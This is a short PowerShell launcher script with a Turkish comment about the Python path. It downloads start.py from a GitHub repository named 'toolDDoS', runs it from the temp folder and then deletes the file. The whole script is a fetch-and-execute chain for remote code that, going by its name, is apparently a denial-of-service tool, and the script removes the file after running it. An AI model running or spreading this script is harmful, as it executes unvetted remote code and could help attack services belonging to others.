$pythonPath = "python"  # Sistem PATH'te python varsa böyle bırak, yoksa python.exe'nin tam yolunu yaz
$url = "https://raw.githubusercontent.com/doguiaste/toolDDoS/main/start.py"
$tempFile = "$env:TEMP\start.py"

Invoke-WebRequest -Uri $url -OutFile $tempFile
& $pythonPath $tempFile
Remove-Item $tempFile
